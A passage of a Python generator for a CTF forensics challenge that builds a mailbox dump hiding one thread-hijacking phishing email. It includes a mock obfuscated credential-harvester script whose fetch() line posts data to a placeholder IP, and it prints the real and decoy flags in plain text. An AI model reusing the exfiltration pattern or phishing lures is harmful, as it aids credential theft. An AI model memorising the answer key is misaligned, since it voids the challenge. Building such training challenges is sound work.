#!/usr/bin/env python3
"""
KCTF 2026 MISC — inbox-triage
문제 생성기.

메일함 덤프 600통 중 실제 침해에 쓰인 스레드 하이재킹 메일 1통을 찾는 문제.

설계 요점 (SPEC.md 참조):

  1. 판별자는 '문체' 가 아니라 **구조** 다.
     초안은 "본문 톤이 자연스러운 것" 을 구분점으로 삼았는데, 505통을 한 번의
     템플릿 생성으로 만들면 그 판별자는 어느 쪽으로든 무너진다. 전부 기계적으로
     읽히거나, 진짜만 유독 잘 쓰인 티가 난다. 무엇보다 **측정할 수가 없다.**
     그래서 판별 기준을 Message-ID 그래프 불변식으로 잡았다. 생성기가 강제할 수
     있고 솔버가 검증할 수 있다.

         H 는 답장이다 (In-Reply-To 가 코퍼스 내 메일을 가리킨다)
         AND thread(H) - H 의 참여자가 전원 사내 도메인이다   [내부 전용 스레드]
         AND From(H) 의 도메인이 사내 도메인이 아니다          [외부인]

     근접 오답을 일부러 심는다:
       - 외부 발신자가 이미 참여 중이던 스레드에 답장  -> '내부 전용' 조건 탈락
       - 내부 발신자가 처음 끼어드는 스레드에 답장      -> '외부인' 조건 탈락
     두 조건의 **교집합** 이 유일해야 한다.

  2. 키는 조상 체인 전체를 걸어야만 얻을 수 있다. (열거 불가여야 한다)
     초안 1: 키가 그 메일 안의 도메인   -> 첨부 grep + 도메인 대입으로 끝
     초안 2: 키가 루트 Message-ID 로컬파트 + '@' + 위조 도메인
             -> 로컬파트 600개 x 첨부 66개 = 39,600회 대입이 0.1초.
                블라인드 검증에서 실측되었고, 의도된 경로보다 싸다.
     지금은 키 재료가 **조상 Message-ID 전체(루트~부모)를 이어붙인 것 + 위조 도메인**
     이다. 조합적으로 열거할 수 없고 그래프를 실제로 걸어야만 나온다.

  3. 난독화 첨부는 65통이 갖는다.
     5통만 가지면 "첨부 있는 메일 찾기" 로 후보가 5개로 줄어 분류 과정이 통째로
     사라진다.

  4. 미끼도 답장이어야 한다. (블라인드 검증에서 드러난 구멍)
     초안은 첨부 보유 66통 중 In-Reply-To 를 가진 것이 진짜 하나뿐이었다.
     그래서 그래프를 세울 필요 없이 불리언 두 개로 끝났다:
         multipart -> 66통,  In-Reply-To 존재 -> 1통
     지금은 미끼 스팸도 답장 형태를 갖는다.
       - 존재하지 않는 Message-ID 를 가리키는 것 (dangling)  -> 해석 실패
       - 외부 참여자가 있는 벤더 스레드에 매달린 것          -> '내부 전용' 탈락
     각 단계가 후보를 조금씩만 줄이고, 마지막 조건에서야 1통이 된다.

  5. References 누락도 단서가 되면 안 된다.
     진짜만 References 가 없으면 그 자체가 비명처럼 튄다.
     정상 답장의 상당수도 직전 부모만 담은 짧은 References 를 갖게 해서
     진짜의 형태가 특별해 보이지 않도록 한다.

  6. 암호는 반복키 XOR 이 아니다.
     평문이 KCTF{ 로 시작하므로 반복키 XOR 은 crib-drag 로 즉사한다.
     SHA256 카운터 모드 키스트림을 쓴다 (순수 파이썬 15줄로 구현 가능,
     외부 의존성 없음).
"""

import base64
import hashlib
import os
import random
import shutil
import zipfile
from email.message import EmailMessage
from email.utils import format_datetime
from datetime import datetime, timedelta, timezone

FLAG = "KCTF{thr34d_h1j4ck_h1d3s_1n_th3_gr4ph}"

INCIDENT_BRIEF = """\
NORITE SYSTEMS — INCIDENT TRIAGE
================================

침해사고 대응 중 확보한 직원 메일함 덤프 600통이다.
이 중 딱 한 통이 실제 자격증명 탈취에 성공했다.

공격자는 새 대화를 시작하지 않았다. 기존 내부 업무 대화에 외부 발신자로
끼어들었고, 스팸 필터까지 통과했다. 스팸으로 분류된 메일만 살펴보면 정답을
놓치게 된다.

해당 메일을 식별하고 첨부 파일을 분석해 플래그를 복구하라.
"""

SEED = 20260320
N_TOTAL = 600

CORP = "norite-systems.com"
SPOOF = "norite-systerns.com"        # rn != m  (호모글리프)

HERE = os.path.dirname(os.path.abspath(__file__))
DIST = os.path.join(HERE, "dist")
MAIL_DIR = os.path.join(DIST, "inbox-triage", "maildump")

KST = timezone(timedelta(hours=9))
T0 = datetime(2026, 3, 2, 9, 0, tzinfo=KST)

# ---------------------------------------------------------------- 회사 설정

PEOPLE = [
    ("정도현", "dohyun.jung"), ("한서윤", "seoyun.han"),
    ("오지훈", "jihoon.oh"), ("배수민", "sumin.bae"),
    ("문가영", "gayoung.moon"), ("신재현", "jaehyun.shin"),
    ("임채원", "chaewon.lim"), ("곽민석", "minseok.kwak"),
    ("류하은", "haeun.ryu"), ("전우진", "woojin.jeon"),
    ("남기태", "kitae.nam"), ("소연우", "yeonwoo.so"),
    ("추다인", "dain.chu"), ("표진호", "jinho.pyo"),
]

SYSTEMS = ["Meridian", "Halcyon", "Kestrel", "Tessera", "Orrery"]
PROJECTS = ["Bluefin 마이그레이션", "SOC2 2분기 감사", "Kestrel 3.0 롤아웃"]

VENDORS = [
    ("Aldebaran Cloud", "support@aldebaran-cloud.example.com"),
    ("Pallas Security", "contact@pallas-sec.example.net"),
    ("Vireo Analytics", "team@vireo-analytics.example.org"),
]

THREAD_SUBJECTS = [
    "{sys} 배포 창구 조정", "{proj} 주간 상태 공유", "{sys} 알럿 임계값 재설정",
    "{proj} 리스크 등록부 업데이트", "{sys} 인증서 만료 일정",
    "{proj} 킥오프 회의록", "{sys} 용량 증설 검토",
    "{sys} 장애 회고", "{proj} 산출물 리뷰 요청", "{sys} 접근 권한 정리",
    "{proj} 예산 재배정", "{sys} 로그 보존 정책", "{proj} 외부 감사 대응",
    "{sys} 백업 복구 테스트", "{proj} 일정 재조정",
]

BODY_OPEN = [
    "확인 부탁드립니다.", "아래 내용 공유드립니다.", "논의된 내용 정리했습니다.",
    "간단히 회신드립니다.", "관련해서 업데이트 있습니다.",
]
BODY_MID = [
    "{sys} 쪽 지표는 어제부로 정상 범위입니다.",
    "{proj} 일정은 다음 주 화요일 기준으로 잡았습니다.",
    "담당자 배정은 {who} 님으로 정리했습니다.",
    "티켓 번호는 NS-{tick} 입니다.",
    "{sys} 재기동은 점검 창구에 맞춰 진행하겠습니다.",
    "지난 회의에서 나온 이슈는 별도 스레드로 옮기겠습니다.",
    "관련 문서는 Tessera 에 올려두었습니다.",
]
BODY_CLOSE = [
    "추가 의견 있으시면 알려주세요.", "확인 후 회신 부탁드립니다.",
    "감사합니다.", "이상입니다.", "필요하시면 회의 잡겠습니다.",
]

SPAM_SUBJECTS = [
    "URGENT: Your account will be suspended",
    "Re: Invoice #{n} OVERDUE - immediate action required",
    "Your password expires TODAY - verify now",
    "Congratulations! You have won",
    "SECURITY ALERT: unusual sign-in detected",
    "Payroll update required - action needed",
    "Your mailbox is FULL - click to upgrade",
    "Final notice: verify your credentials",
    "Document shared with you - login required",
    "IT Support: mandatory password reset",
]

# 첨부 파일명 풀. 진짜가 쓰는 이름이 이 안에 반드시 포함되어야 한다 —
# 이름이 유일하면 난독화 형태를 통일해도 파일명 하나로 다시 튄다.
ATT_NAMES = [
    "VPN_Cert_Renewal.html", "Secure_Document.html", "Invoice_Details.html",
    "Payroll_Notice.html", "Account_Verification.html", "Mailbox_Upgrade.html",
    "Password_Reset.html", "Shared_File.html", "Delivery_Notice.html",
]

SPAM_DOMAINS = [
    "secure-verify.example.com", "mail-update.example.net",
    "account-service.example.org", "notice-center.example.com",
    "id-confirm.example.net", "billing-alert.example.org",
    # 사내 도메인 유사물도 섞는다. 이게 없으면 첨부 66개의 host 값을 나열했을 때
    # 사내 도메인처럼 보이는 것이 딱 하나뿐이라, 그래프 분석 없이 진짜가 특정된다.
    # 여러 개면 '유사 도메인' 만으로는 못 고르고 결국 불변식을 봐야 한다.
    "norite-systerns.com", "norlte-systems.com", "norite-systems.co",
    "norite-sytems.com", "n0rite-systems.com",
]

# 스팸 본문.
#
# 고정 템플릿 두 개를 65통에 그대로 반복하면 안 된다. 본문으로 군집화했을 때
# 미끼가 거대한 군집 두 개를 이루고 진짜만 홀로 남아서, '첨부 보유 AND 본문이
# 반복 템플릿이 아님' 이라는 불리언 두 개로 특정된다.
# 정상 메일과 마찬가지로 매번 달라지게 조립한다.
#
# 진짜가 쓰는 'VPN 인증서 갱신' 구실도 풀에 넣는다. 그러지 않으면 그 키워드
# 하나로 다시 특정된다.
SPAM_PRETEXT_KO = [
    "계정 보안 정책 변경에 따라 인증 정보 재확인이 필요합니다.",
    "VPN 인증서가 곧 만료됩니다. 갱신 절차를 진행해 주세요.",
    "미납 청구서가 확인되었습니다. 즉시 확인이 필요합니다.",
    "비정상 로그인 시도가 감지되어 계정이 일시 잠금되었습니다.",
    "메일함 용량이 초과되어 수신이 중단될 예정입니다.",
    "급여 명세 시스템 접근 권한 재확인이 필요합니다.",
    "공유 문서 열람을 위해 본인 확인이 필요합니다.",
]
SPAM_PRETEXT_EN = [
    "Your account credentials require immediate re-verification.",
    "Your VPN certificate expires shortly. Please complete renewal.",
    "An unpaid invoice has been detected on your account.",
    "Unusual sign-in activity has locked your account.",
    "Your mailbox has exceeded its storage quota.",
    "Payroll portal access must be re-confirmed.",
    "A document has been shared with you and requires sign-in.",
]
SPAM_CLOSE_KO = ["감사합니다.", "협조 부탁드립니다.", "빠른 처리 부탁드립니다."]
SPAM_CLOSE_EN = ["Regards,", "Thank you,", "Sincerely,"]
SPAM_TEAM_KO = ["계정관리팀", "IT 지원팀", "보안운영팀", "서비스운영팀"]
SPAM_TEAM_EN = ["Account Team", "IT Support", "Security Operations", "Billing"]


# 사내 공지 사칭 본문. 진짜 하이재킹 메일과 **같은 함수** 로 만든다.
#
# 진짜만 '사내 업무 답장' 문체이고 나머지 65통이 스팸 블라스트 문체이면,
# 본문으로 군집화하는 것만으로 66통 중 1통이 특정된다.
# 사내 주소를 위조한 미끼들도 같은 문체를 쓰게 해서 군집을 채운다.
INTERNAL_PRETEXT = [
    ("VPN 인증서 만료 안내", "해당 스레드 참여자분들의 VPN 인증서가 "
                       "이번 주 {day}요일 만료 예정입니다."),
    ("계정 정책 변경 안내", "{sys} 접근 계정의 인증 정책이 이번 주 {day}요일부터 "
                     "변경됩니다."),
    ("보안 점검 협조 요청", "{sys} 관련 보안 점검이 이번 주 {day}요일 예정되어 "
                     "있습니다."),
    ("인증서 재발급 안내", "{sys} 서버 인증서 재발급이 이번 주 {day}요일 "
                    "진행됩니다."),
]


def make_internal_lure_body(g) -> str:
    r = g.r
    title, line = r.choice(INTERNAL_PRETEXT)
    line = line.format(day=r.choice("월화수목금"), sys=r.choice(SYSTEMS))
    return "\n".join([
        "안녕하세요,", "",
        "말씀 주신 건과 별개로, " + line,
        "첨부된 " + r.choice(["갱신 도구", "확인 도구", "점검 스크립트"])
        + "를 실행하시면 자동으로 처리됩니다.",
        f"문의는 티켓 NS-{r.randint(1000, 9999)} 으로 주시면 됩니다.",
        "", "감사합니다.", "IT Helpdesk", ""])


def make_spam_body(g) -> str:
    r = g.r
    ko = r.random() < 0.55
    pre = r.choice(SPAM_PRETEXT_KO if ko else SPAM_PRETEXT_EN)
    ref = f"REF-{r.randrange(10**6):06d}"
    if ko:
        lines = ["안녕하세요,", "", pre,
                 "첨부된 문서를 열어 절차를 완료해 주시기 바랍니다.",
                 f"접수번호는 {ref} 입니다.",
                 r.choice(["기한 내 처리되지 않으면 서비스 이용이 제한될 수 있습니다.",
                           "미처리 시 계정이 잠길 수 있습니다.",
                           "확인은 24시간 이내에 완료되어야 합니다."]),
                 "", r.choice(SPAM_CLOSE_KO), r.choice(SPAM_TEAM_KO), ""]
    else:
        lines = ["Dear user,", "", pre,
                 "Please open the attached document and complete the process.",
                 f"Your reference number is {ref}.",
                 r.choice(["Failure to comply may interrupt your service.",
                           "Your account may be locked if unverified.",
                           "This must be completed within 24 hours."]),
                 "", r.choice(SPAM_CLOSE_EN), r.choice(SPAM_TEAM_EN), ""]
    return "\n".join(lines)

# 모델에 통째로 던지는 솔버를 잡기 위한 미끼. 눈으로 보면 가짜인 게 명확해야
# 한다 (스코어보드 스프레이 방지). 자동 요약에는 그럴듯하게 걸린다.
# 미끼 플래그는 **자기가 미끼라고 말하면 안 된다.**
#
# 초안은 "keep looking", "d3c0y", "wr0ng_0ne" 이라고 적혀 있어서, 후보를 전부
# 복호한 솔버가 아무 분석 없이 진짜를 골라냈다. 미끼가 자기를 신고하면
# 복호 자체가 판별기가 되어버린다.
# 진짜와 구분되지 않는 문구여야 결국 불변식으로 판정하게 된다.
DECOY_FLAGS = [
    "KCTF{cr3d_h4rv3st3r_st4g3_tw0}",
    "KCTF{vpn_c3rt_lur3_d3pl0y3d}",
    "KCTF{bluef1n_q2_b34c0n_k3y}",
    "KCTF{h3lpd3sk_sp00f_p4yl0ad}",
    "KCTF{s3ss10n_c00k13_3xf1l_0k}",
    "KCTF{m41lb0x_rul3_p3rs1st3nc3}",
]


# ---------------------------------------------------------------- 암호

KDF_ROUNDS = 12_000_000


def derive_key(material: str) -> bytes:
    """
    반복 해시로 키를 늘린다.

    키 재료가 코퍼스 구조에서 유도되는 한 열거는 원리적으로 막을 수 없다.
    블라인드 검증에서 확인된 후보 공간은 '어떤 메일의 루트->자신 경로' 600개 x
    첨부 66개 = 39,600회, 0.07초였다.

    스트레칭은 그 산수를 바꾼다.
        정직한 경로  후보 1개     x 12M = 1.8초
        무차별 대입  후보 39,600개 x 12M = 약 20시간
    즉 '전부 대입한다' 를 '분석해서 후보를 좁힌다' 로 강제한다.
    """
    h = material.encode()
    for _ in range(KDF_ROUNDS):
        h = hashlib.sha256(h).digest()
    return h


def keystream(key: bytes, n: int) -> bytes:
    """SHA256 카운터 모드."""
    out = b""
    i = 0
    while len(out) < n:
        out += hashlib.sha256(key + str(i).encode()).digest()
        i += 1
    return out[:n]


def encrypt(plain: bytes, material: str) -> bytes:
    # 명세와 구현이 반드시 같아야 한다. 초안은 주석에 key = sha256(MATERIAL)
    # 이라 적어놓고 실제로는 중간 해시 없이 sha256(MATERIAL + i) 를 썼다.
    # 올바른 체인을 찾은 솔버가 명세대로 구현하면 쓰레기가 나오고, 자기 체인이
    # 틀린 줄 알게 된다 (블라인드 검증에서 실제로 발생).
    return bytes(a ^ b for a, b in zip(plain, keystream(derive_key(material),
                                                        len(plain))))


# ---------------------------------------------------------------- 헤더 조립

class Gen:
    def __init__(self, seed):
        self.r = random.Random(seed)
        self.mid_n = 0
        self.mails = []          # (Message-ID, EmailMessage)

    def mid(self) -> str:
        self.mid_n += 1
        h = hashlib.sha1(f"mid{self.mid_n}{SEED}".encode()).hexdigest()[:16]
        return f"<{h}@{CORP}>"

    def addr(self, person) -> str:
        name, local = person
        return f"{name} <{local}@{CORP}>"

    def internal_received(self, dt) -> list:
        a = self.r.randint(2, 40)
        return [
            f"from mx-int-0{self.r.randint(1,3)}.{CORP} (10.20.4.{a}) "
            f"by mbox-0{self.r.randint(1,9)}.{CORP} with ESMTPS; "
            f"{format_datetime(dt)}",
        ]

    def external_received(self, dt, ip) -> list:
        return [
            f"from mx-edge-0{self.r.randint(1,2)}.{CORP} (10.20.1.5) "
            f"by mbox-0{self.r.randint(1,9)}.{CORP} with ESMTPS; "
            f"{format_datetime(dt)}",
            f"from unknown ([{ip}]) by mx-edge-0{self.r.randint(1,2)}.{CORP} "
            f"with ESMTP; {format_datetime(dt - timedelta(seconds=3))}",
        ]

    def build(self, *, frm, to, subject, body, dt, mid,
              in_reply_to=None, references=None, external_ip=None,
              spf="pass", attachment=None, spam_score=None):
        m = EmailMessage()
        m["Message-ID"] = mid
        m["Date"] = format_datetime(dt)
        m["From"] = frm
        m["To"] = ", ".join(to)
        m["Subject"] = subject
        if in_reply_to:
            m["In-Reply-To"] = in_reply_to
        if references:
            m["References"] = " ".join(references)

        rec = (self.external_received(dt, external_ip) if external_ip
               else self.internal_received(dt))
        for r in rec:                     # Received 는 역순으로 쌓인다
            m["Received"] = r

        dom = frm.split("@")[-1].rstrip(">")
        m["Authentication-Results"] = (
            f"mx.{CORP}; spf={spf} smtp.mailfrom={dom}; "
            f"dkim={'pass' if spf == 'pass' else 'none'}; "
            f"dmarc={'pass' if spf == 'pass' else 'fail'}")
        # 반드시 다른 메일과 같은 코드 경로로 같은 위치에 넣어야 한다.
        # 진짜만 나중에 del + 재추가 하면 헤더 순서가 그 메일에서만 달라지고,
        # 그 한 가지로 600통 중 1통이 특정된다 (블라인드 검증에서 실제로 걸렸다).
        score = self.r.uniform(0.0, 3.0) if spam_score is None else spam_score
        m["X-Norite-Spam-Score"] = f"{score:.1f}"

        m.set_content(body)

        if attachment:
            fname, data = attachment
            m.add_attachment(data, maintype="text", subtype="html",
                             filename=fname)
        return m

    def emit(self, m):
        self.mails.append((m["Message-ID"], m))


# ---------------------------------------------------------------- 본문 생성

def make_body(g, sysname, proj, n, signer=None):
    r = g.r
    parts = [r.choice(BODY_OPEN), ""]
    for _ in range(r.randint(1, 3)):
        t = r.choice(BODY_MID)
        parts.append(t.format(sys=sysname, proj=proj,
                              who=r.choice(PEOPLE)[0],
                              tick=r.randint(1000, 9999)))
    # 서명은 반드시 발신자와 일치해야 한다. 어긋나면 BEC 사칭 단서처럼 보여서
    # 코퍼스 전체가 거대한 미끼가 된다 (블라인드 검증에서 지적됨).
    who = signer[0] if signer else r.choice(PEOPLE)[0]
    parts += ["", r.choice(BODY_CLOSE), "",
              "--", f"{who} / Norite Systems"]
    return "\n".join(parts)


# ---------------------------------------------------------------- 첨부

HARVESTER_JS = """\
(function(){
  // norite vpn cert helper -- campaign bluefin-q2
  var host = "%s";
  var blob = [%s];

  // beacon key material = the thread we grafted onto, as a "," joined list of
  // its Message-IDs (each exactly as in the header, angle brackets included),
  // then "|" then host.
  //
  //   MATERIAL = "<id>,<id>,...,<id>" + "|" + host
  //   key      = sha256 applied 12000000 times, iteratively:
  //                h = MATERIAL as ascii bytes
  //                repeat 12000000 times:  h = sha256(h)
  //                key = h        (raw 32-byte digest, not hex)

  // keystream = sha256(key + str(i)) concatenated, i = 0,1,2,...  (decimal i)
  // plain[j] = blob[j] ^ keystream[j]
  function decode(k){ /* sha256-ctr */ }

  fetch("https://198.51.100.77/collect", {method:"POST", body:decode(0)});
})();
"""


def make_attachment(g, js_source: str) -> bytes:
    """
    1차 난독화: 문자코드 배열 + 재조립. 풀면 위 JS 소스가 그대로 나온다.
    키 유도 방법은 이 JS 안에 명시되어 있다 — 출제자 마음 알아맞히기가 아니다.
    """
    codes = ",".join(str(ord(c)) for c in js_source)
    html = f"""<!doctype html>
<html><head><meta charset="utf-8"><title>VPN Certificate Renewal</title></head>
<body>
<p>Norite Systems VPN certificate renewal. Please wait...</p>
<script>
var _c=[{codes}];
var _s="";for(var i=0;i<_c.length;i++){{_s+=String.fromCharCode(_c[i]);}}
(new Function(_s))();
</script>
</body></html>
"""
    return html.encode()


def make_decoy_attachment(g, host: str, material: str, fake_flag=None) -> bytes:
    """
    미끼 첨부.

    **진짜와 구조가 완전히 같아야 한다.** 초안은 미끼만 eval(atob(...)) 형태였고
    진짜만 문자코드 배열이라, 첨부 66개를 뽑아 형태만 봐도 1개가 즉시 튀었다.
    그러면 600통 분류가 통째로 건너뛰어진다.

    미끼도 같은 래퍼, 같은 키 유도 주석, 같은 blob 배열을 갖는다.
    일부 미끼는 자기 Message-ID 로 유도한 키로 가짜 플래그를 실어둔다 —
    무차별 대입으로 접근하는 솔버가 가짜를 집게 만든다.
    """
    r = g.r
    if fake_flag:
        # 문서화된 유도 규칙을 이 미끼의 조상 체인에 그대로 적용한 결과다.
        # 즉 후보 25통에 규칙을 기계적으로 다 돌리면 진짜 1 + 가짜 4 가 나오고,
        # 어느 것이 진짜인지는 결국 불변식으로 판정해야 한다.
        # (초안은 미끼 blob 이 순수 난수여서 복호되는 순간 정답이 확정됐다)
        blob = encrypt(fake_flag.encode(), material)
    else:
        blob = bytes(r.randrange(256) for _ in range(r.randint(28, 48)))
    js = HARVESTER_JS % (host, ",".join(str(b) for b in blob))
    return make_attachment(g, js)


# ---------------------------------------------------------------- 코퍼스

def generate():
    g = Gen(SEED)
    r = g.r

    # ---- 내부 스레드
    threads = []          # 각 스레드: [(mid, from_addr, dt), ...]
    t = T0
    for ti in range(88):
        sysname = r.choice(SYSTEMS)
        proj = r.choice(PROJECTS)
        subj = r.choice(THREAD_SUBJECTS).format(sys=sysname, proj=proj)
        members = r.sample(PEOPLE, r.randint(2, 4))
        chain = []
        refs = []
        n_msg = r.randint(3, 6)
        for k in range(n_msg):
            # 답장 순서와 날짜 순서를 일부러 어긋나게 한다.
            # 그러지 않으면 제목으로 묶고 날짜로 정렬하는 것만으로 조상 체인이
            # 복원되어, 그래프를 만지지 않고도 키가 조립된다 (1,529회 시도).
            t += timedelta(minutes=r.randint(20, 900))
            if k and r.random() < 0.45:
                t -= timedelta(minutes=r.randint(30, 1500))
            sender = members[k % len(members)]
            others = [g.addr(p) for p in members if p != sender]
            mid = g.mid()
            # 정상 답장의 약 40%는 직전 부모만 담은 짧은 References 를 갖는다.
            # 진짜 하이재킹 메일의 References 형태가 특별해 보이지 않게 하기 위함.
            if refs:
                use_refs = refs[-1:] if r.random() < 0.4 else list(refs)
            else:
                use_refs = None
            m = g.build(
                frm=g.addr(sender), to=others,
                subject=subj if k == 0 else "Re: " + subj,
                body=make_body(g, sysname, proj, k, signer=sender), dt=t, mid=mid,
                in_reply_to=chain[-1][0] if chain else None,
                references=use_refs)
            g.emit(m)
            chain.append((mid, g.addr(sender), t))
            refs.append(mid)
        threads.append({"subject": subj, "chain": chain,
                        "members": [g.addr(p) for p in members],
                        "external": False, "sys": sysname, "proj": proj})

    # ---- 외부 참여자가 있는 벤더 스레드 (근접 오답 A: 외부인이지만 원래 참여자)
    for ti in range(14):
        vname, vaddr = r.choice(VENDORS)
        sysname = r.choice(SYSTEMS)
        proj = r.choice(PROJECTS)
        subj = f"[{vname}] " + r.choice(THREAD_SUBJECTS).format(
            sys=sysname, proj=proj)
        members = r.sample(PEOPLE, 2)
        vendor_from = f"{vname} <{vaddr}>"
        chain, refs = [], []
        for k in range(r.randint(3, 5)):
            t += timedelta(minutes=r.randint(30, 700))
            external = (k % 2 == 1)
            sender = vendor_from if external else g.addr(members[k % 2])
            mid = g.mid()
            m = g.build(
                frm=sender,
                to=[vendor_from] if not external else [g.addr(p) for p in members],
                subject=subj if k == 0 else "Re: " + subj,
                body=make_body(g, sysname, proj, k), dt=t, mid=mid,
                in_reply_to=chain[-1][0] if chain else None,
                references=list(refs) if refs else None,
                external_ip=f"203.0.113.{r.randint(2, 250)}" if external else None,
                spf="pass" if external else "pass")
            g.emit(m)
            chain.append((mid, sender, t))
            refs.append(mid)
        threads.append({"subject": subj, "chain": chain,
                        "members": [vendor_from] + [g.addr(p) for p in members],
                        "external": True, "sys": sysname, "proj": proj})

    # ---- 근접 오답 B: 내부 직원이 처음 끼어드는 답장 (외부인 조건 탈락)
    internal_threads = [th for th in threads if not th["external"]]
    for th in r.sample(internal_threads, 22):
        outsider = r.choice([p for p in PEOPLE
                             if g.addr(p) not in th["members"]])
        t += timedelta(minutes=r.randint(10, 300))
        mid = g.mid()
        m = g.build(
            frm=g.addr(outsider), to=th["members"],
            subject="Re: " + th["subject"],
            body="지나가다 봤는데 한 가지 덧붙입니다.\n\n"
                 + make_body(g, th["sys"], th["proj"], 0, signer=outsider),
            dt=t, mid=mid, in_reply_to=th["chain"][-1][0])
        g.emit(m)

    # ---- 사내 공지 (단독 메일)
    for _ in range(24):
        t += timedelta(minutes=r.randint(60, 800))
        sysname = r.choice(SYSTEMS)
        who = r.choice(PEOPLE)
        g.emit(g.build(
            frm=g.addr(who),
            to=[f"all-staff@{CORP}"],
            subject=f"[공지] {sysname} 정기 점검 안내",
            body=make_body(g, sysname, r.choice(PROJECTS), 0, signer=who),
            dt=t, mid=g.mid()))

    # ---- 명백한 스팸/피싱 (전부 난독화 첨부 보유)
    #
    # 상당수가 '답장' 형태를 갖는다. 이게 없으면 In-Reply-To 존재 여부만으로
    # 진짜가 특정되어 그래프 분석이 통째로 사라진다.
    #   0~17번  : 존재하지 않는 Message-ID 를 가리킨다 (해석 실패)
    #   18~31번 : 외부 참여자가 있는 벤더 스레드에 매달린다 ('내부 전용' 탈락)
    #   나머지  : 단독 메일
    vendor_threads = [th for th in threads if th["external"]]
    internal_pool = [th for th in threads if not th["external"]]
    decoy_ancestors = {}
    decoy_slots = list(range(65))
    r.shuffle(decoy_slots)
    # 가짜 플래그는 조상 체인이 있는 미끼(18~41번)에만 싣는다
    chained = [i for i in decoy_slots if 18 <= i < 42]
    fake_slots = set(chained[:len(DECOY_FLAGS)])
    corpus_end = t
    for i in range(65):
        # 날짜를 코퍼스 전체 기간에서 뽑는다.
        # 순차 생성 그대로 두면 미끼 65통이 전부 마지막 달에 몰리고,
        # 진짜만 다른 달이 되어 Date 정렬 한 번으로 특정된다.
        t_spam = T0 + timedelta(
            seconds=r.randint(0, int((corpus_end - T0).total_seconds())))
        dom = r.choice(SPAM_DOMAINS)
        fake = DECOY_FLAGS[chained.index(i)] if i in fake_slots else None
        mid_local = hashlib.sha1(f"spam{i}".encode()).hexdigest()[:16]

        irt = refs_hdr = None
        subj = r.choice(SPAM_SUBJECTS).format(n=r.randint(10000, 99999))
        recipients = [g.addr(r.choice(PEOPLE)).split("<")[1].rstrip(">")]

        # 수신자가 여럿이면서 전원 사내인 메일을 미끼에도 만들어 둔다.
        # 이게 없으면 '수신자 2명 이상 AND 전원 사내' 라는 불리언 두 개로
        # 진짜가 특정된다 (실제로 감사에서 걸렸다).
        if r.random() < 0.45:
            recipients = [g.addr(p).split("<")[1].rstrip(">")
                          for p in r.sample(PEOPLE, r.randint(2, 4))]

        if i < 18:
            # 존재하지 않는 Message-ID 를 가리키는 답장
            ghost = hashlib.sha1(f"ghost{i}".encode()).hexdigest()[:16]
            irt = f"<{ghost}@{r.choice(SPAM_DOMAINS)}>"
            subj = "Re: " + subj
        elif i < 32:
            # 외부 참여자가 이미 있는 벤더 스레드에 매달린 답장
            th = vendor_threads[(i - 18) % len(vendor_threads)]
            decoy_ancestors[i] = [m for m, _, _ in th["chain"]]
            irt = th["chain"][-1][0]
            # 부모 대비 답장 지연을 진짜와 같은 분포로 둔다.
            # 그러지 않으면 진짜만 '부모 후 3시간', 나머지는 '수십 일 후' 가 되어
            # 지연 시간 하나로 완벽히 갈린다.
            t_spam = th["chain"][-1][2] + timedelta(minutes=r.randint(20, 900))
            subj = "Re: " + th["subject"]
            recipients = th["members"]
            if r.random() < 0.5:
                refs_hdr = [irt]
        elif i < 42:
            # 사내 주소를 위조해 내부 전용 스레드에 매달린 답장.
            # 이게 없으면 '첨부 보유 AND References 1개 AND 수신자 전원 사내'
            # 처럼 그래프가 전혀 필요 없는 불리언 3개로 진짜가 특정된다.
            # 이 미끼들은 발신 도메인이 사내라서 '외부인' 조건에서 탈락한다.
            th = internal_pool[(i - 32) % len(internal_pool)]
            decoy_ancestors[i] = [m for m, _, _ in th["chain"]]
            irt = th["chain"][-1][0]
            t_spam = th["chain"][-1][2] + timedelta(minutes=r.randint(20, 900))
            subj = "Re: " + th["subject"]
            recipients = th["members"]
            refs_hdr = [irt]
            dom = CORP

        # 가짜 플래그는 이 미끼의 조상 체인으로 암호화한다 (규칙은 진짜와 동일).
        # 체인이 없는 미끼(단독/dangling)에는 가짜 플래그를 싣지 않는다.
        anc = decoy_ancestors.get(i)
        if fake and not anc:
            fake = None
        att = (r.choice(ATT_NAMES),
               make_decoy_attachment(
                   g, dom, (",".join(anc) + "|" + dom) if anc else "", fake))

        # 가짜 플래그를 실은 미끼는 반드시 '스팸 필터가 잡는' 상태여야 한다.
        #
        # 규칙을 66통에 전수 복호하면 진짜 1 + 가짜 플래그 미끼가 함께 나온다.
        # 이때 미끼가 우연히 인증 통과 + 낮은 스팸이면, 진짜와 구분할 objective
        # 판별자가 사라져 최종 1통을 찍게 된다 (블라인드 검증에서 tie 발생).
        # 진짜만 spf=pass + 낮은 스팸이 되도록, 가짜 미끼는 spf=fail + 높은 스팸.
        # (사내 주소 스푸핑인데 spf=fail 은 현실적인 침해 징후이기도 하다)
        # 그래도 진짜를 특정하려면 결국 그래프 불변식이 필요하다 —
        # 이 장치는 '전수 복호' 근사 경로에서 가짜를 걸러줄 뿐이다.
        if fake:
            decoy_spf, decoy_spam = "fail", r.uniform(2.2, 3.0)
        else:
            decoy_spf, decoy_spam = r.choice(
                ["fail", "fail", "softfail", "pass"]), None

        g.emit(g.build(
            frm=(f'"IT Helpdesk" <helpdesk@{dom}>' if dom == CORP else
                 f'"{r.choice(["Account Team","IT Support","Billing","Security"])}"'
                 f' <{r.choice(["no-reply","admin","service","alert"])}@{dom}>'),
            to=recipients,
            subject=subj,
            body=(make_internal_lure_body(g) if dom == CORP
                  else make_spam_body(g)),
            dt=t_spam, mid=f"<{mid_local}@{dom}>",
            in_reply_to=irt, references=refs_hdr,
            external_ip=f"{r.choice(['192.0.2', '198.51.100', '203.0.113'])}."
                        f"{r.randint(2, 250)}",
            spf=decoy_spf, spam_score=decoy_spam,
            attachment=att))

    # ---- 회색지대: 외부 마케팅/벤더 단독 메일
    for i in range(26):
        t += timedelta(minutes=r.randint(30, 600))
        vname, vaddr = r.choice(VENDORS)
        g.emit(g.build(
            frm=f"{vname} <{vaddr}>",
            to=[g.addr(r.choice(PEOPLE)).split("<")[1].rstrip(">")],
            subject=f"[{vname}] 분기 뉴스레터 및 서비스 업데이트",
            body="안녕하세요,\n\n이번 분기 서비스 업데이트를 안내드립니다.\n"
                 "자세한 내용은 포털에서 확인하실 수 있습니다.\n\n감사합니다.\n",
            dt=t, mid=f"<{hashlib.sha1(f'mkt{i}'.encode()).hexdigest()[:16]}"
                      f"@{vaddr.split('@')[1]}>",
            external_ip=f"{r.choice(['192.0.2', '198.51.100', '203.0.113'])}."
                        f"{r.randint(2, 250)}",
